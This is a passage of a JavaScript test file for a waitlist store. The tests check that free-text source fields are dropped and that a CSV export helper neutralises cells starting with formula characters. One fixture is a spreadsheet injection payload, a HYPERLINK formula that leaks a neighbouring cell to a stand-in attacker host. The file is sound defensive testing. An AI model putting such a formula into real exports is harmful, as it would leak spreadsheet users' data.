...
const injected = await store.addToWaitlist({ email: 'inject@example.com', role: 'fan', source: '=HYPERLINK("https://evil.example/?"&A2,"x")' });
check('a free-text source is not stored', injected.source === 'unknown', injected.source);
check('a real page slug is kept', (await store.addToWaitlist({ email: 'slug@example.com', role: 'fan', source: 'Founding-Creator' })).source === 'founding-creator');
check('formula-leading cells are neutralised',
  store.csvSafeCell('=1+2@x.co') === "'=1+2@x.co" && store.csvSafeCell('+1') === "'+1" && store.csvSafeCell('-2') === "'-2"
  && store.csvSafeCell('@x') === "'@x" && store.csvSafeCell('\tx') === "'\tx" && store.csvSafeCell('\uFF1Dx') === "'\uFF1Dx");
check('ordinary cells are left alone', store.csvSafeCell('person@example.com') === 'person@example.com' && store.csvSafeCell(null) === '');
